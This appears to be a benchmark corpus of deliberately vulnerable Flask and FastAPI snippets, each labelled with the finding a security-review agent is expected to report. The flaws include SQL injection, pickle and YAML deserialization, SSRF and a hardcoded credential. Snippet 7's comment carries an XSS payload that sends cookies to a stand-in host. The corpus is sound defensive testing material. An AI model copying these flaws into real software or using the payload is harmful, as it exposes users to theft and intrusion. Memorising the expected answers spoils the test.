# Security eval corpus — Python / Flask / FastAPI vulnerable snippets

These are deliberately insecure Python 3.12 + Flask 3 (and FastAPI where it better illustrates the pattern) snippets used as a regression corpus for the `security-reviewer` agent. Each snippet is annotated with the expected finding.

Stack: Python 3.12, Flask 3, FastAPI 0.110, `psycopg` (psycopg3), `pymongo`, `pyjwt`, `python-magic`, `pyyaml`, `pickle`.

Format:

````
### N. <short title>

<one-line description>

```python
# EXPECTED: <Severity> <Category> — <brief description>
<vulnerable code>
```
````

Severities: `Critical`, `High`, `Medium`, `Low`.
Categories: `SecretsExposure`, `MissingAuthentication`, `BrokenAuthorization`, `InputValidation`, `SQLInjection`, `XSS`, `CSRF`, `MissingSecurityHeaders`, `WeakRateLimiting`, `CORSMisconfiguration`, `InsecureCookie`, `DependencyVulnerability`, `InsecureFileUpload`, `SSRF`, `ErrorLeakage`, `LoggingPII`.

---

### 1. Hardcoded database URL in source

Database credentials embedded in source — exposed in git history and any place the file is read.

```python
# EXPECTED: Critical SecretsExposure — hardcoded database URL with credentials committed to source
import psycopg

conn = psycopg.connect("postgresql://admin:hunter2@db.prod.example.com/appdb")

app = Flask(__name__)
```

---

### 2. Missing auth on admin route

Flask route returns sensitive admin data with no session or token check.

```python
# EXPECTED: Critical MissingAuthentication — /admin/users route returns all users with no auth check
from flask import Flask, jsonify
import psycopg

app = Flask(__name__)

@app.route("/admin/users")
def list_users():
    with psycopg.connect(conn_str) as conn:
        rows = conn.execute("SELECT id, email, role FROM users").fetchall()
    return jsonify([dict(r) for r in rows])
```

---

### 3. IDOR — document fetched by ID with no ownership check

Authenticated user can retrieve any invoice by its integer ID.

```python
# EXPECTED: Critical BrokenAuthorization — invoice queried by id only, no user_id ownership constraint
from flask import g, jsonify

@app.route("/invoices/<int:invoice_id>")
@require_auth
def get_invoice(invoice_id):
    with psycopg.connect(conn_str) as conn:
        row = conn.execute(
            "SELECT * FROM invoices WHERE id = %s", (invoice_id,)
        ).fetchone()
    if not row:
        return jsonify({"error": "Not found"}), 404
    return jsonify(dict(row))
```

---

### 4. SQL injection via f-string

User input interpolated directly into a SQL query string.

```python
# EXPECTED: Critical SQLInjection — user-controlled status value interpolated into SQL f-string
from flask import request, jsonify

@app.route("/orders")
@require_auth
def list_orders():
    status = request.args.get("status", "pending")
    with psycopg.connect(conn_str) as conn:
        rows = conn.execute(
            f"SELECT id, total FROM orders WHERE status = '{status}' AND user_id = {g.user_id}"
        ).fetchall()
    return jsonify([dict(r) for r in rows])
```

---

### 5. Deserialization via pickle.loads on user-supplied data

`pickle.loads` on untrusted bytes is an RCE vector — arbitrary code runs during deserialization.

```python
# EXPECTED: Critical InputValidation — pickle.loads on user-supplied request body enables remote code execution
import pickle
from flask import request, jsonify

@app.route("/api/restore-session", methods=["POST"])
def restore_session():
    # Client sends a pickled session blob
    session_data = pickle.loads(request.data)
    user_id = session_data.get("user_id")
    return jsonify({"user_id": user_id})
```

---

### 6. Unsafe YAML — yaml.load without Loader

`yaml.load()` without an explicit safe loader executes arbitrary Python objects embedded in YAML.

```python
# EXPECTED: Critical InputValidation — yaml.load() without Loader=yaml.SafeLoader enables remote code execution
import yaml
from flask import request, jsonify

@app.route("/api/import-config", methods=["POST"])
@require_auth
def import_config():
    raw = request.data.decode("utf-8")
    config = yaml.load(raw)   # yaml.safe_load() required
    return jsonify({"imported": list(config.keys())})
```

---

### 7. XSS via Markup() wrapping user input

`Markup()` marks a string as safe, bypassing Jinja2 autoescape — stored XSS if user content is rendered.

```python
# EXPECTED: High XSS — Markup() applied to user-controlled bio disables Jinja2 autoescape, enabling stored XSS
from markupsafe import Markup
from flask import render_template

@app.route("/profile/<int:user_id>")
def profile(user_id):
    user = get_user(user_id)
    # Attacker sets bio to: <script>document.location='https://evil.example/steal?c='+document.cookie</script>
    return render_template("profile.html", bio=Markup(user["bio"]))
```

---

### 8. CSRF — no CSRF protection on state-changing endpoint

Flask app with no `CSRFProtect` and no `Origin` check; any cross-origin page can issue POST requests using the user's session cookie.

```python
# EXPECTED: Medium CSRF — state-changing POST route has no CSRF token or Origin validation
from flask import request, jsonify, g

@app.route("/account/delete", methods=["POST"])
@require_auth
def delete_account():
    with psycopg.connect(conn_str) as conn:
        conn.execute("DELETE FROM users WHERE id = %s", (g.user_id,))
    return jsonify({"ok": True})
```

---

### 9. CORS misconfiguration — wildcard origin with credentials

`flask-cors` configured with `origins="*"` and `supports_credentials=True`.

```python
# EXPECTED: High CORSMisconfiguration — CORS wildcard origin combined with supports_credentials=True
from flask_cors import CORS

CORS(
    app,
    origins="*",
    supports_credentials=True,
    methods=["GET", "POST", "PUT", "DELETE"],
)
```

---

### 10. In-memory rate limiting via module-level dict

Module-level `dict` is process-local; rate limit is invisible to other workers or after a restart.

```python
# EXPECTED: High WeakRateLimiting — module-level dict used as rate-limit store, not shared across workers or restarts
from collections import defaultdict
from flask import request, jsonify
import time

_attempts: dict[str, list[float]] = defaultdict(list)

@app.route("/auth/login", methods=["POST"])
def login():
    ip = request.remote_addr
    now = time.time()
    window = [t for t in _attempts[ip] if now - t < 900]
    if len(window) >= 5:
        return jsonify({"error": "Too many attempts"}), 429
    _attempts[ip] = window + [now]
    # ... verify credentials
```

---

### 11. Session cookie without HttpOnly and Secure flags

Flask session cookie issued without `SESSION_COOKIE_HTTPONLY` and `SESSION_COOKIE_SECURE`.

```python
# EXPECTED: High InsecureCookie — Flask session cookie missing SESSION_COOKIE_HTTPONLY and SESSION_COOKIE_SECURE
from flask import Flask

app = Flask(__name__)
app.secret_key = "dev-secret-do-not-use"
# SESSION_COOKIE_HTTPONLY defaults to True in Flask >= 1.0 but Secure defaults to False
app.config["SESSION_COOKIE_SECURE"] = False
app.config["SESSION_COOKIE_SAMESITE"] = None
```

---

### 12. SSRF via requests.get on user-supplied URL

`requests.get` called with a user-provided URL — attacker can reach IMDS at `169.254.169.254` or internal services.

```python
# EXPECTED: Critical SSRF — requests.get called with user-supplied URL, no allowlist or IMDS block
import requests
from flask import request, jsonify

@app.route("/api/fetch-preview", methods=["POST"])
@require_auth
def fetch_preview():
    url = request.json.get("url")
    resp = requests.get(url, timeout=5)
    return jsonify({"content": resp.text[:2000]})
```

---

### 13. File upload trusts Content-Type instead of magic bytes

`f.content_type` comes from the `Content-Type` header the browser/client sets — an attacker sends `image/jpeg` for a PHP webshell.

```python
# EXPECTED: High InsecureFileUpload — file type checked via Content-Type header, not magic bytes; client-controlled
from flask import request, jsonify

ALLOWED = {"image/jpeg", "image/png", "image/webp"}

@app.route("/upload", methods=["POST"])
@require_auth
def upload():
    f = request.files.get("file")
    if not f or f.content_type not in ALLOWED:
        return jsonify({"error": "Images only"}), 400
    safe_path = f"/var/uploads/{f.filename}"   # also: path traversal if filename contains ../
    f.save(safe_path)
    return jsonify({"ok": True})
```

---

### 14. Timing-attack-vulnerable password comparison

`==` operator short-circuits; an attacker can enumerate valid passwords character-by-character via timing differences.

```python
# EXPECTED: High BrokenAuthorization — plain == used for HMAC/token comparison, vulnerable to timing attack
import hmac
from flask import request, jsonify

@app.route("/webhook/stripe", methods=["POST"])
def stripe_webhook():
    payload = request.data
    sig = request.headers.get("Stripe-Signature", "")
    expected = hmac.new(
        WEBHOOK_SECRET.encode(), payload, "sha256"
    ).hexdigest()
    # == short-circuits on first differing byte — timing oracle
    if sig != expected:
        return jsonify({"error": "Invalid signature"}), 400
    # ... process event
```

---

### 15. Error response returns str(e) to client

Raw exception string (including DB error text, table names, file paths) returned in the JSON response body.

```python
# EXPECTED: Medium ErrorLeakage — str(e) returned in API response, leaks DB error text and internal details
from flask import jsonify

@app.errorhandler(Exception)
def handle_error(e):
    return jsonify({
        "error": str(e),
        "type": type(e).__name__,
    }), 500
```

---

## How to use this corpus

1. Run the `security-reviewer` agent in Deployment Review mode against a file containing these snippets, or paste individual snippets into a review session.
2. For each snippet, the agent should produce at minimum the finding annotated in the `# EXPECTED:` comment.
3. Track recall (how many EXPECTED findings the agent surfaces) and precision (how many agent findings are not in the corpus) across runs.
4. When adding new snippets, follow the same format and include a `# EXPECTED:` comment with a category from the controlled vocabulary.
